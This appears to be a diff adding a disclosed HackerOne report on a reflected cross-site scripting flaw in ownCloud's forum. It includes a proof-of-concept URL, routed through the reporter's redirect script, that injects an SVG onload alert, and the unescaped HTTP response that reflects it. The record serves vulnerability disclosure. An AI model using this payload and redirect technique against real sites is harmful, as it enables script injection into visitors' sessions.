@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/154319
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/bobrov
+ReportedTo:ownCloud(owncloud)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:30.08.2016 16:26:03
+
+Summary:
+
+**PoC** (Internet Explorer, Edge):
+```
+https://blackfan.ru/x?r=https://forum.owncloud.org/<svg/onload=alert(document.domain)>/%252e%252e
+```
+blackfan.ru/x?r - simple redirection script, that necessary for exploitation
+
+
+**HTTP Response**:
+```html
+<div class="panel" id="message">
+	<div class="inner">
+	<h2 class="message-title">Information</h2>
+	<p>No route found for "GET /<svg/onload=alert(document.domain)>/%2e%2e"</p>
+		</div>
+</div>
+```
